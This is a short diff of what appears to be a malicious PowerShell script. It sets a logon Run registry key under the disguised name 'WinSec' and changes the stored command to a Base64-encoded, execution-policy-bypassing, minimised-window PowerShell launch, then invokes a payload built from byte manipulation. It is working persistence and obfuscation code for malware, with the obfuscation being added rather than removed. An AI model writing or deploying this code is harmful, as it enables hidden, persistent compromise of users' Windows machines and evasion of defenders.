@@ -134,5 +134,5 @@ For ($i=0; $i -lt $L.Length; $i++) {$L[$i] = [System.BitConverter]::GetBytes($L[
 
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Name "WinSec" `
-    -Value ("powershell.exe -exec bypass -W 1 -C " + $la)
+    -Value ("powershell.exe -exec bypass -W 1 -enc " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($la)))
 $la.Invoke()
